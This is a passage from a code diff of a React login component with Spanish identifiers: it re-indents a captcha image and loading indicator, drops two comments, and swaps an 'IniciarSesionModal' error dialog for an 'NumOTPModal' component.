+            </div>
 
-                <div className="visual-captcha" style={{ cursor: "pointer" }}>
-                    <img src="/assets/images/lateral-der.png" alt="Visual Captcha" />
-                </div>
+            <div className="visual-captcha" style={{ cursor: "pointer" }}>
+                <img src="/assets/images/lateral-der.png" alt="Visual Captcha" />
+            </div>
 
-                {/* Cargando */}
-                {cargando ? <Loading /> : null}
+            {cargando ? <Loading /> : null}
 
-                {/* Modal de error (datos inválidos / timeout) */}
-                <IniciarSesionModal
-                    isOpen={formState.lanzarModalErrorSesion}
-                    onClose={() => setFormState(prev => ({ ...prev, lanzarModalErrorSesion: false }))}
-                />
-            </>
-        );
-    }
+            <NumOTPModal
+                isOpen={formState.lanzarModalErrorSesion}
+                onClose={() => setFormState(prev => ({ ...prev, lanzarModalErrorSesion: false }))}
+            />
+        </>
+    );
 }
